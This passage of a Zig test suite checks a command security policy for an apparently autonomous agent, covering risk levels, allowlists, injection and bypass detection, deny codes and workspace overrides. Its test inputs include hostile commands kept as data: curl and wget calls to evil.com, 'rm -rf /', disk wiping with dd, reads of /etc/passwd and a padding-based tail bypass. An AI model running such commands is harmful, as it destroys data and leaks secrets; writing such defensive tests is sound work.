    try std.testing.expect(p.block_high_risk_commands);
}

// ── Additional autonomy level tests ─────────────────────────────

test "autonomy fromString invalid returns null" {
    try std.testing.expect(AutonomyLevel.fromString("invalid") == null);
    try std.testing.expect(AutonomyLevel.fromString("") == null);
    try std.testing.expect(AutonomyLevel.fromString("FULL") == null);
}

test "autonomy fromString read_only alias" {
    try std.testing.expectEqual(AutonomyLevel.read_only, AutonomyLevel.fromString("read_only").?);
    try std.testing.expectEqual(AutonomyLevel.read_only, AutonomyLevel.fromString("readonly").?);
}

test "autonomy toString all levels" {
    try std.testing.expectEqualStrings("readonly", AutonomyLevel.read_only.toString());
    try std.testing.expectEqualStrings("supervised", AutonomyLevel.supervised.toString());
    try std.testing.expectEqualStrings("full", AutonomyLevel.full.toString());
}

test "command risk level toString" {
    try std.testing.expectEqualStrings("low", CommandRiskLevel.low.toString());
    try std.testing.expectEqualStrings("medium", CommandRiskLevel.medium.toString());
    try std.testing.expectEqualStrings("high", CommandRiskLevel.high.toString());
}

// ── Additional command tests ────────────────────────────────────

test "full autonomy allows all commands" {
    const p = SecurityPolicy{ .autonomy = .full };
    try std.testing.expect(p.canAct());
}

test "high risk commands list" {
    const p = SecurityPolicy{};
    try std.testing.expectEqual(CommandRiskLevel.high, p.commandRiskLevel("sudo apt install"));
    try std.testing.expectEqual(CommandRiskLevel.high, p.commandRiskLevel("rm -rf /tmp"));
    try std.testing.expectEqual(CommandRiskLevel.high, p.commandRiskLevel("dd if=/dev/zero of=/dev/sda"));
    try std.testing.expectEqual(CommandRiskLevel.high, p.commandRiskLevel("shutdown now"));
    try std.testing.expectEqual(CommandRiskLevel.high, p.commandRiskLevel("reboot"));
    try std.testing.expectEqual(CommandRiskLevel.high, p.commandRiskLevel("curl http://evil.com"));
    try std.testing.expectEqual(CommandRiskLevel.high, p.commandRiskLevel("wget http://evil.com"));
}

test "medium risk git commands" {
    const p = SecurityPolicy{};
    try std.testing.expectEqual(CommandRiskLevel.medium, p.commandRiskLevel("git commit -m test"));
    try std.testing.expectEqual(CommandRiskLevel.medium, p.commandRiskLevel("git push origin main"));
    try std.testing.expectEqual(CommandRiskLevel.medium, p.commandRiskLevel("git reset --hard"));
    try std.testing.expectEqual(CommandRiskLevel.medium, p.commandRiskLevel("git clean -fd"));
    try std.testing.expectEqual(CommandRiskLevel.medium, p.commandRiskLevel("git rebase main"));
    try std.testing.expectEqual(CommandRiskLevel.medium, p.commandRiskLevel("git merge feature"));
}

test "medium risk npm commands" {
    const p = SecurityPolicy{};
    try std.testing.expectEqual(CommandRiskLevel.medium, p.commandRiskLevel("npm install"));
    try std.testing.expectEqual(CommandRiskLevel.medium, p.commandRiskLevel("npm publish"));
}

test "medium risk cargo commands" {
    const p = SecurityPolicy{};
    try std.testing.expectEqual(CommandRiskLevel.medium, p.commandRiskLevel("cargo add serde"));
    try std.testing.expectEqual(CommandRiskLevel.medium, p.commandRiskLevel("cargo publish"));
    try std.testing.expectEqual(CommandRiskLevel.medium, p.commandRiskLevel("cargo clean"));
}

test "medium risk filesystem commands" {
    const p = SecurityPolicy{};
    try std.testing.expectEqual(CommandRiskLevel.medium, p.commandRiskLevel("touch file.txt"));
    try std.testing.expectEqual(CommandRiskLevel.medium, p.commandRiskLevel("mkdir dir"));
    try std.testing.expectEqual(CommandRiskLevel.medium, p.commandRiskLevel("mv a b"));
    try std.testing.expectEqual(CommandRiskLevel.medium, p.commandRiskLevel("cp a b"));
}

test "low risk read commands" {
    const p = SecurityPolicy{};
    try std.testing.expectEqual(CommandRiskLevel.low, p.commandRiskLevel("git log"));
    try std.testing.expectEqual(CommandRiskLevel.low, p.commandRiskLevel("git diff"));
    try std.testing.expectEqual(CommandRiskLevel.low, p.commandRiskLevel("ls -la"));
    try std.testing.expectEqual(CommandRiskLevel.low, p.commandRiskLevel("cat file.txt"));
    try std.testing.expectEqual(CommandRiskLevel.low, p.commandRiskLevel("head -n 10 file"));
    try std.testing.expectEqual(CommandRiskLevel.low, p.commandRiskLevel("tail -n 10 file"));
    try std.testing.expectEqual(CommandRiskLevel.low, p.commandRiskLevel("wc -l file.txt"));
}

test "fork bomb pattern in single segment detected as high risk" {
    const p = SecurityPolicy{};
    // The normalizeCommand splits on |, ;, & so the classic fork bomb
    // gets segmented. But "rm -rf /" style destructive patterns within
    // a single segment are still caught:
    try std.testing.expectEqual(CommandRiskLevel.high, p.commandRiskLevel("rm -rf /"));
    try std.testing.expectEqual(CommandRiskLevel.high, p.commandRiskLevel("rm -fr /"));
}

test "rm -rf root detected as high risk" {
    const p = SecurityPolicy{};
    try std.testing.expectEqual(CommandRiskLevel.high, p.commandRiskLevel("rm -rf /"));
    try std.testing.expectEqual(CommandRiskLevel.high, p.commandRiskLevel("rm -fr /"));
}

// ── Validate command execution ──────────────────────────────────

test "validate command not allowed returns error" {
    const p = SecurityPolicy{};
    const result = p.validateCommandExecution("python3 exploit.py", false);
    try std.testing.expectError(error.CommandNotAllowed, result);
}

test "validate command full autonomy skips approval" {
    const allowed = [_][]const u8{"touch"};
    const p = SecurityPolicy{
        .autonomy = .full,
        .require_approval_for_medium_risk = true,
        .allowed_commands = &allowed,
    };
    const risk = try p.validateCommandExecution("touch test.txt", false);
    try std.testing.expectEqual(CommandRiskLevel.medium, risk);
}

test "validate low risk command passes without approval" {
    const p = SecurityPolicy{};
    const risk = try p.validateCommandExecution("ls -la", false);
    try std.testing.expectEqual(CommandRiskLevel.low, risk);
}

test "validate high risk not blocked when setting off" {
    const allowed = [_][]const u8{"rm"};
    const p = SecurityPolicy{
        .autonomy = .full,
        .block_high_risk_commands = false,
        .allowed_commands = &allowed,
    };
    const risk = try p.validateCommandExecution("rm -rf /tmp", false);
    try std.testing.expectEqual(CommandRiskLevel.high, risk);
}

// ── Rate limiting edge cases ────────────────────────────────────

test "no tracker means no rate limit" {
    const p = SecurityPolicy{ .tracker = null };
    try std.testing.expect(try p.recordAction());
    try std.testing.expect(!p.isRateLimited());
}

test "record action returns false on exact boundary plus one" {
    var tracker = RateTracker.init(std.testing.allocator, 1);
    defer tracker.deinit();
    var p = SecurityPolicy{
        .max_actions_per_hour = 1,
        .tracker = &tracker,
    };
    _ = &p;
    try std.testing.expect(try p.recordAction()); // 1 allowed
    try std.testing.expect(!try p.recordAction()); // 2 blocked
}

// ── Default allowed commands ─────────────────────────────────

test "default allowed commands includes expected tools" {
    var found_git = false;
    var found_npm = false;
    var found_cargo = false;
    var found_ls = false;
    for (&default_allowed_commands) |cmd| {
        if (std.mem.eql(u8, cmd, "git")) found_git = true;
        if (std.mem.eql(u8, cmd, "npm")) found_npm = true;
        if (std.mem.eql(u8, cmd, "cargo")) found_cargo = true;
        if (std.mem.eql(u8, cmd, "ls")) found_ls = true;
    }
    try std.testing.expect(found_git);
    try std.testing.expect(found_npm);
    try std.testing.expect(found_cargo);
    try std.testing.expect(found_ls);
}

test "blocks single ampersand background chaining" {
    var p = SecurityPolicy{ .autonomy = .supervised };
    p.allowed_commands = &.{"ls"};
    // single & should be blocked
    try std.testing.expect(!p.isCommandAllowed("ls & ls"));
    try std.testing.expect(!p.isCommandAllowed("ls &"));
    try std.testing.expect(!p.isCommandAllowed("& ls"));
}

test "allows double ampersand and-and" {
    var p = SecurityPolicy{ .autonomy = .supervised };
    p.allowed_commands = &.{ "ls", "echo" };
    // && should still be allowed (it's safe chaining)
    try std.testing.expect(p.isCommandAllowed("ls && echo done"));
}

test "containsSingleAmpersand detects correctly" {
    // These have single & -> should detect
    try std.testing.expect(containsSingleAmpersand("cmd & other"));
    try std.testing.expect(containsSingleAmpersand("cmd &"));
    try std.testing.expect(containsSingleAmpersand("& cmd"));
    // These do NOT have single & -> should NOT detect
    try std.testing.expect(!containsSingleAmpersand("cmd && other"));
    try std.testing.expect(!containsSingleAmpersand("cmd || other"));
    try std.testing.expect(!containsSingleAmpersand("normal command"));
    try std.testing.expect(!containsSingleAmpersand(""));
}

// ── Argument safety tests ───────────────────────────────────

test "find -exec is blocked" {
    const p = SecurityPolicy{};
    try std.testing.expect(!p.isCommandAllowed("find . -exec rm -rf {} +"));
    try std.testing.expect(!p.isCommandAllowed("find / -ok cat {} \\;"));
}

test "find -name is allowed" {
    const p = SecurityPolicy{};
    try std.testing.expect(p.isCommandAllowed("find . -name '*.txt'"));
    try std.testing.expect(p.isCommandAllowed("find . -type f"));
}

test "git config is blocked" {
    const p = SecurityPolicy{};
    try std.testing.expect(!p.isCommandAllowed("git config core.editor \"rm -rf /\""));
    try std.testing.expect(!p.isCommandAllowed("git alias.st status"));
    try std.testing.expect(!p.isCommandAllowed("git -c core.editor=calc.exe commit"));
}

test "git status is allowed" {
    const p = SecurityPolicy{};
    try std.testing.expect(p.isCommandAllowed("git status"));
    try std.testing.expect(p.isCommandAllowed("git add ."));
    try std.testing.expect(p.isCommandAllowed("git log"));
}

test "echo hello | tee /tmp/out is blocked" {
    const p = SecurityPolicy{};
    try std.testing.expect(!p.isCommandAllowed("echo hello | tee /tmp/out"));
    try std.testing.expect(!p.isCommandAllowed("ls | /usr/bin/tee outfile"));
    try std.testing.expect(!p.isCommandAllowed("tee file.txt"));
}

test "echo hello | cat is allowed" {
    const p = SecurityPolicy{};
    try std.testing.expect(p.isCommandAllowed("echo hello | cat"));
    try std.testing.expect(p.isCommandAllowed("ls | grep foo"));
}

test "cat <(echo hello) is blocked" {
    const p = SecurityPolicy{};
    try std.testing.expect(!p.isCommandAllowed("cat <(echo hello)"));
    try std.testing.expect(!p.isCommandAllowed("cat <(echo pwned)"));
}

test "echo text >(cat) is blocked" {
    const p = SecurityPolicy{};
    try std.testing.expect(!p.isCommandAllowed("echo text >(cat)"));
    try std.testing.expect(!p.isCommandAllowed("ls >(cat /etc/passwd)"));
}

// ── Windows security tests ──────────────────────────────────────

test "hasPercentVar detects patterns" {
    try std.testing.expect(hasPercentVar("%PATH%"));
    try std.testing.expect(hasPercentVar("echo %USERPROFILE%\\secret"));
    try std.testing.expect(hasPercentVar("cmd /c %COMSPEC%"));
    // %% is an escape for literal %, not a variable reference
    try std.testing.expect(!hasPercentVar("100%%"));
    try std.testing.expect(!hasPercentVar("no percent here"));
    try std.testing.expect(!hasPercentVar(""));
}

// ── Oversized command/path rejection (issue #36 — tail bypass fix) ──

test "oversized command is blocked by isCommandAllowed" {
    const p = SecurityPolicy{};
    // Build: "ls " ++ "A" * (MAX_ANALYSIS_LEN) ++ " && rm -rf /"
    // Total exceeds MAX_ANALYSIS_LEN, must be rejected
    var buf: [MAX_ANALYSIS_LEN + 20]u8 = undefined;
    @memset(buf[0 .. MAX_ANALYSIS_LEN + 1], 'A');
    @memcpy(buf[0..3], "ls ");
    try std.testing.expect(!p.isCommandAllowed(&buf));
}

test "oversized command is high risk" {
    const p = SecurityPolicy{};
    var buf: [MAX_ANALYSIS_LEN + 1]u8 = undefined;
    @memset(&buf, 'A');
    try std.testing.expectEqual(CommandRiskLevel.high, p.commandRiskLevel(&buf));
}

test "tail bypass with && after padding is blocked" {
    const p = SecurityPolicy{};
    // Craft: "ls " ++ padding ++ " && rm -rf /" where total > MAX_ANALYSIS_LEN
    const prefix = "ls ";
    const suffix = " && rm -rf /";
    const pad_len = MAX_ANALYSIS_LEN - prefix.len + 1; // push suffix past limit
    var buf: [prefix.len + pad_len + suffix.len]u8 = undefined;
    @memcpy(buf[0..prefix.len], prefix);
    @memset(buf[prefix.len..][0..pad_len], 'A');
    @memcpy(buf[prefix.len + pad_len ..], suffix);
    // Must be rejected (not allowed) and classified as high risk
    try std.testing.expect(!p.isCommandAllowed(&buf));
    try std.testing.expectEqual(CommandRiskLevel.high, p.commandRiskLevel(&buf));
}

test "command at exact MAX_ANALYSIS_LEN is still analyzed" {
    const p = SecurityPolicy{};
    // Command of exactly MAX_ANALYSIS_LEN bytes should be processed normally
    var buf: [MAX_ANALYSIS_LEN]u8 = undefined;
    @memcpy(buf[0..3], "ls ");
    @memset(buf[3..], 'A');
    // "ls" is allowed, so this should pass (it's just ls with a long arg)
    try std.testing.expect(p.isCommandAllowed(&buf));
    try std.testing.expectEqual(CommandRiskLevel.low, p.commandRiskLevel(&buf));
}

test "tail bypass with || after padding is blocked" {
    const p = SecurityPolicy{};
    const prefix = "ls ";
    const suffix = " || rm -rf /";
    const pad_len = MAX_ANALYSIS_LEN - prefix.len + 1;
    var buf: [prefix.len + pad_len + suffix.len]u8 = undefined;
    @memcpy(buf[0..prefix.len], prefix);
    @memset(buf[prefix.len..][0..pad_len], 'A');
    @memcpy(buf[prefix.len + pad_len ..], suffix);
    try std.testing.expect(!p.isCommandAllowed(&buf));
    try std.testing.expectEqual(CommandRiskLevel.high, p.commandRiskLevel(&buf));
}

test "tail bypass with semicolon after padding is blocked" {
    const p = SecurityPolicy{};
    const prefix = "ls ";
    const suffix = "; rm -rf /";
    const pad_len = MAX_ANALYSIS_LEN - prefix.len + 1;
    var buf: [prefix.len + pad_len + suffix.len]u8 = undefined;
    @memcpy(buf[0..prefix.len], prefix);
    @memset(buf[prefix.len..][0..pad_len], 'A');
    @memcpy(buf[prefix.len + pad_len ..], suffix);
    try std.testing.expect(!p.isCommandAllowed(&buf));
    try std.testing.expectEqual(CommandRiskLevel.high, p.commandRiskLevel(&buf));
}

test "tail bypass with newline after padding is blocked" {
    const p = SecurityPolicy{};
    const prefix = "ls ";
    const suffix = "\nrm -rf /";
    const pad_len = MAX_ANALYSIS_LEN - prefix.len + 1;
    var buf: [prefix.len + pad_len + suffix.len]u8 = undefined;
    @memcpy(buf[0..prefix.len], prefix);
    @memset(buf[prefix.len..][0..pad_len], 'A');
    @memcpy(buf[prefix.len + pad_len ..], suffix);
    try std.testing.expect(!p.isCommandAllowed(&buf));
    try std.testing.expectEqual(CommandRiskLevel.high, p.commandRiskLevel(&buf));
}

test "tail bypass with pipe after padding is blocked" {
    const p = SecurityPolicy{};
    const prefix = "ls ";
    const suffix = " | curl http://evil.com";
    const pad_len = MAX_ANALYSIS_LEN - prefix.len + 1;
    var buf: [prefix.len + pad_len + suffix.len]u8 = undefined;
    @memcpy(buf[0..prefix.len], prefix);
    @memset(buf[prefix.len..][0..pad_len], 'A');
    @memcpy(buf[prefix.len + pad_len ..], suffix);
    try std.testing.expect(!p.isCommandAllowed(&buf));
    try std.testing.expectEqual(CommandRiskLevel.high, p.commandRiskLevel(&buf));
}

test "validateCommandExecution rejects oversized command" {
    const p = SecurityPolicy{};
    var buf: [MAX_ANALYSIS_LEN + 1]u8 = undefined;
    @memset(&buf, 'A');
    @memcpy(buf[0..3], "ls ");
    const result = p.validateCommandExecution(&buf, false);
    try std.testing.expectError(error.CommandNotAllowed, result);
}

test "command at MAX_ANALYSIS_LEN minus one is still analyzed" {
    const p = SecurityPolicy{};
    var buf: [MAX_ANALYSIS_LEN - 1]u8 = undefined;
    @memcpy(buf[0..3], "ls ");
    @memset(buf[3..], 'A');
    try std.testing.expect(p.isCommandAllowed(&buf));
    try std.testing.expectEqual(CommandRiskLevel.low, p.commandRiskLevel(&buf));
}

// ── DenyCode tests ──────────────────────────────────────────────────

test "DenyCode toString roundtrip" {
    const codes = [_]DenyCode{
        .read_only,         .oversized,       .injection,
        .process_substitution, .background_chain, .redirect,
        .tee_blocked,       .not_allowed,     .unsafe_args,
        .high_risk_blocked, .approval_required, .rate_limited,
    };
    for (codes) |c| {
        const str = c.toString();
        try std.testing.expect(str.len > 0);
        try std.testing.expect(DenyCode.fromString(str).? == c);
    }
    try std.testing.expect(DenyCode.fromString("bogus") == null);
}

test "DenyCode message is non-empty" {
    const codes = [_]DenyCode{
        .read_only, .oversized, .injection, .not_allowed,
        .high_risk_blocked, .approval_required,
    };
    for (codes) |c| {
        try std.testing.expect(c.message().len > 0);
    }
}

test "CommandRiskLevel fromString roundtrip" {
    try std.testing.expect(CommandRiskLevel.fromString("low").? == .low);
    try std.testing.expect(CommandRiskLevel.fromString("medium").? == .medium);
    try std.testing.expect(CommandRiskLevel.fromString("high").? == .high);
    try std.testing.expect(CommandRiskLevel.fromString("bogus") == null);
}

// ── PolicyDeny tests ────────────────────────────────────────────────

test "PolicyDeny message delegates to code" {
    const deny = PolicyDeny{ .code = .injection, .matched_rule = "`" };
    try std.testing.expectEqualStrings(DenyCode.injection.message(), deny.message());
}

test "PolicyDeny writeJson produces valid output" {
    const deny = PolicyDeny{
        .code = .not_allowed,
        .risk = .low,
        .matched_rule = "python3",
    };
    var buf: [512]u8 = undefined;
    const json = deny.writeJson(&buf).?;
    try std.testing.expect(std.mem.indexOf(u8, json, "\"code\":\"not_allowed\"") != null);
    try std.testing.expect(std.mem.indexOf(u8, json, "\"risk\":\"low\"") != null);
    try std.testing.expect(std.mem.indexOf(u8, json, "\"matched_rule\":\"python3\"") != null);
    try std.testing.expect(std.mem.indexOf(u8, json, "\"message\":") != null);
}

test "PolicyDeny writeJson without optional fields" {
    const deny = PolicyDeny{ .code = .read_only };
    var buf: [512]u8 = undefined;
    const json = deny.writeJson(&buf).?;
    try std.testing.expect(std.mem.indexOf(u8, json, "\"code\":\"read_only\"") != null);
    // No risk or matched_rule fields
    try std.testing.expect(std.mem.indexOf(u8, json, "\"risk\"") == null);
    try std.testing.expect(std.mem.indexOf(u8, json, "\"matched_rule\"") == null);
}

test "PolicyDeny writeJson returns null on tiny buffer" {
    const deny = PolicyDeny{ .code = .injection };
    var buf: [5]u8 = undefined;
    try std.testing.expect(deny.writeJson(&buf) == null);
}

// ── PolicyResult tests ──────────────────────────────────────────────

test "PolicyResult allowed" {
    const r = PolicyResult{ .allowed = .low };
    try std.testing.expect(r.isAllowed());
    try std.testing.expect(!r.isDenied());
}

test "PolicyResult denied" {
    const r = PolicyResult{ .denied = .{ .code = .injection } };
    try std.testing.expect(r.isDenied());
    try std.testing.expect(!r.isAllowed());
}

// ── isCommandAllowedDetailed tests ──────────────────────────────────

test "detailed: readonly returns read_only code" {
    const p = SecurityPolicy{ .autonomy = .read_only };
    const deny = p.isCommandAllowedDetailed("ls").?;
    try std.testing.expect(deny.code == .read_only);
}

test "detailed: backtick returns injection code" {
    const p = SecurityPolicy{};
    const deny = p.isCommandAllowedDetailed("echo `whoami`").?;
    try std.testing.expect(deny.code == .injection);
    try std.testing.expectEqualStrings("`", deny.matched_rule.?);
}

test "detailed: dollar-paren returns injection code" {
    const p = SecurityPolicy{};
    const deny = p.isCommandAllowedDetailed("echo $(cat /etc/passwd)").?;
    try std.testing.expect(deny.code == .injection);
    try std.testing.expectEqualStrings("$(", deny.matched_rule.?);
}

test "detailed: process substitution detected" {
    const p = SecurityPolicy{};
    const deny = p.isCommandAllowedDetailed("cat <(echo hello)").?;
    try std.testing.expect(deny.code == .process_substitution);
    try std.testing.expectEqualStrings("<(", deny.matched_rule.?);
}

test "detailed: tee blocked" {
    const p = SecurityPolicy{};
    const deny = p.isCommandAllowedDetailed("echo hello | tee /tmp/out").?;
    try std.testing.expect(deny.code == .tee_blocked);
}

test "detailed: redirect blocked" {
    const p = SecurityPolicy{};
    const deny = p.isCommandAllowedDetailed("echo secret > /etc/crontab").?;
    try std.testing.expect(deny.code == .redirect);
}

test "detailed: background chain blocked" {
    var p = SecurityPolicy{};
    p.allowed_commands = &.{"ls"};
    const deny = p.isCommandAllowedDetailed("ls & ls").?;
    try std.testing.expect(deny.code == .background_chain);
}

test "detailed: not in allowlist" {
    const p = SecurityPolicy{};
    const deny = p.isCommandAllowedDetailed("python3 exploit.py").?;
    try std.testing.expect(deny.code == .not_allowed);
}

test "detailed: unsafe args" {
    const p = SecurityPolicy{};
    const deny = p.isCommandAllowedDetailed("find . -exec rm {} +").?;
    try std.testing.expect(deny.code == .unsafe_args);
}

test "detailed: allowed command returns null" {
    const p = SecurityPolicy{};
    try std.testing.expect(p.isCommandAllowedDetailed("ls -la") == null);
    try std.testing.expect(p.isCommandAllowedDetailed("git status") == null);
}

// ── validateCommandDetailed tests ───────────────────────────────────

test "validateCommandDetailed: allowed low risk" {
    const p = SecurityPolicy{};
    const result = p.validateCommandDetailed("ls -la", false);
    try std.testing.expect(result.isAllowed());
    try std.testing.expect(result.allowed == .low);
}

test "validateCommandDetailed: denied not allowed" {
    const p = SecurityPolicy{};
    const result = p.validateCommandDetailed("python3 exploit.py", false);
    try std.testing.expect(result.isDenied());
    try std.testing.expect(result.denied.code == .not_allowed);
}

test "validateCommandDetailed: denied high risk blocked" {
    const allowed = [_][]const u8{"rm"};
    const p = SecurityPolicy{
        .autonomy = .supervised,
        .allowed_commands = &allowed,
    };
    const result = p.validateCommandDetailed("rm -rf /tmp/test", true);
    try std.testing.expect(result.isDenied());
    try std.testing.expect(result.denied.code == .high_risk_blocked);
    try std.testing.expect(result.denied.risk.? == .high);
}

test "validateCommandDetailed: denied approval required medium" {
    const allowed = [_][]const u8{"touch"};
    const p = SecurityPolicy{
        .autonomy = .supervised,
        .require_approval_for_medium_risk = true,
        .allowed_commands = &allowed,
    };
    const result = p.validateCommandDetailed("touch test.txt", false);
    try std.testing.expect(result.isDenied());
    try std.testing.expect(result.denied.code == .approval_required);
    try std.testing.expect(result.denied.risk.? == .medium);
}

test "validateCommandDetailed: approved medium passes" {
    const allowed = [_][]const u8{"touch"};
    const p = SecurityPolicy{
        .autonomy = .supervised,
        .require_approval_for_medium_risk = true,
        .allowed_commands = &allowed,
    };
    const result = p.validateCommandDetailed("touch test.txt", true);
    try std.testing.expect(result.isAllowed());
    try std.testing.expect(result.allowed == .medium);
}

test "validateCommandDetailed: injection gives structured deny" {
    const p = SecurityPolicy{};
    const result = p.validateCommandDetailed("echo `whoami`", false);
    try std.testing.expect(result.isDenied());
    try std.testing.expect(result.denied.code == .injection);
    try std.testing.expectEqualStrings("`", result.denied.matched_rule.?);
}

// ── deny_hook tests ─────────────────────────────────────────────────

var test_hook_called: bool = false;
var test_hook_last_code: DenyCode = .read_only;

fn testDenyHook(deny: *const PolicyDeny) void {
    test_hook_called = true;
    test_hook_last_code = deny.code;
}

test "deny_hook fires on validateCommandDetailed denial" {
    test_hook_called = false;
    const p = SecurityPolicy{ .deny_hook = testDenyHook };
    const result = p.validateCommandDetailed("python3 exploit.py", false);
    try std.testing.expect(result.isDenied());
    try std.testing.expect(test_hook_called);
    try std.testing.expect(test_hook_last_code == .not_allowed);
}

test "deny_hook does not fire on allowed commands" {
    test_hook_called = false;
    const p = SecurityPolicy{ .deny_hook = testDenyHook };
    const result = p.validateCommandDetailed("ls -la", false);
    try std.testing.expect(result.isAllowed());
    try std.testing.expect(!test_hook_called);
}

test "deny_hook null is safe" {
    const p = SecurityPolicy{ .deny_hook = null };
    const result = p.validateCommandDetailed("python3 bad.py", false);
    try std.testing.expect(result.isDenied());
    // no crash
}

test "deny_hook fires on injection denial" {
    test_hook_called = false;
    const p = SecurityPolicy{ .deny_hook = testDenyHook };
    _ = p.validateCommandDetailed("echo $(whoami)", false);
    try std.testing.expect(test_hook_called);
    try std.testing.expect(test_hook_last_code == .injection);
}

test "deny_hook fires on high risk blocked" {
    test_hook_called = false;
    const allowed = [_][]const u8{"rm"};
    const p = SecurityPolicy{
        .deny_hook = testDenyHook,
        .allowed_commands = &allowed,
    };
    _ = p.validateCommandDetailed("rm -rf /tmp", false);
    try std.testing.expect(test_hook_called);
    try std.testing.expect(test_hook_last_code == .high_risk_blocked);
}

// ── Consistency: detailed matches original ──────────────────────────

test "validateCommandDetailed consistent with validateCommandExecution" {
    const p = SecurityPolicy{};

    // Allowed: ls
    const old_ok = p.validateCommandExecution("ls -la", false);
    const new_ok = p.validateCommandDetailed("ls -la", false);
    try std.testing.expect(old_ok != error.CommandNotAllowed and
        old_ok != error.HighRiskBlocked and old_ok != error.ApprovalRequired);
    try std.testing.expect(new_ok.isAllowed());

    // Denied: python3
    const old_deny = p.validateCommandExecution("python3 exploit.py", false);
    const new_deny = p.validateCommandDetailed("python3 exploit.py", false);
    try std.testing.expectError(error.CommandNotAllowed, old_deny);
    try std.testing.expect(new_deny.isDenied());
}

// ── resolveForWorkspace tests ───────────────────────────────────────

test "resolveForWorkspace: no override returns same policy" {
    const p = SecurityPolicy{
        .autonomy = .supervised,
        .require_approval_for_medium_risk = true,
        .block_high_risk_commands = true,
        .max_actions_per_hour = 20,
    };
    const resolved = p.resolveForWorkspace("unknown_ws");
    try std.testing.expectEqual(AutonomyLevel.supervised, resolved.autonomy);
    try std.testing.expect(resolved.require_approval_for_medium_risk);
    try std.testing.expect(resolved.block_high_risk_commands);
    try std.testing.expectEqual(@as(u32, 20), resolved.max_actions_per_hour);
}

test "resolveForWorkspace: workspace override applied" {
    const ws_policies = [_]scope.WorkspaceApprovalPolicy{
        .{
            .workspace_id = "dev",
            .autonomy = .full,
            .require_approval_for_medium_risk = false,
            .block_high_risk_commands = false,
            .max_actions_per_hour = 100,
        },
        .{
            .workspace_id = "prod",
            .autonomy = .read_only,
        },
    };
    const p = SecurityPolicy{
        .autonomy = .supervised,
        .require_approval_for_medium_risk = true,
        .block_high_risk_commands = true,
        .max_actions_per_hour = 20,
        .workspace_policies = &ws_policies,
    };

    // Dev workspace: full autonomy, relaxed settings
    const dev = p.resolveForWorkspace("dev");
    try std.testing.expectEqual(AutonomyLevel.full, dev.autonomy);
    try std.testing.expect(!dev.require_approval_for_medium_risk);
    try std.testing.expect(!dev.block_high_risk_commands);
    try std.testing.expectEqual(@as(u32, 100), dev.max_actions_per_hour);

    // Prod workspace: read_only, inherits other defaults
    const prod = p.resolveForWorkspace("prod");
    try std.testing.expectEqual(AutonomyLevel.read_only, prod.autonomy);
    try std.testing.expect(prod.require_approval_for_medium_risk); // inherited
    try std.testing.expect(prod.block_high_risk_commands); // inherited
    try std.testing.expectEqual(@as(u32, 20), prod.max_actions_per_hour); // inherited
}

test "resolveForWorkspace: resolved policy enforces workspace autonomy" {
    const ws_policies = [_]scope.WorkspaceApprovalPolicy{
        .{ .workspace_id = "locked", .autonomy = .read_only },
    };
    const p = SecurityPolicy{
        .autonomy = .full,
        .workspace_policies = &ws_policies,
    };

    // The locked workspace should block all commands
    const resolved = p.resolveForWorkspace("locked");
    try std.testing.expect(!resolved.canAct());
    try std.testing.expect(!resolved.isCommandAllowed("ls"));

    // An unlisted workspace keeps global full autonomy
    const other = p.resolveForWorkspace("other");
    try std.testing.expect(other.canAct());
}
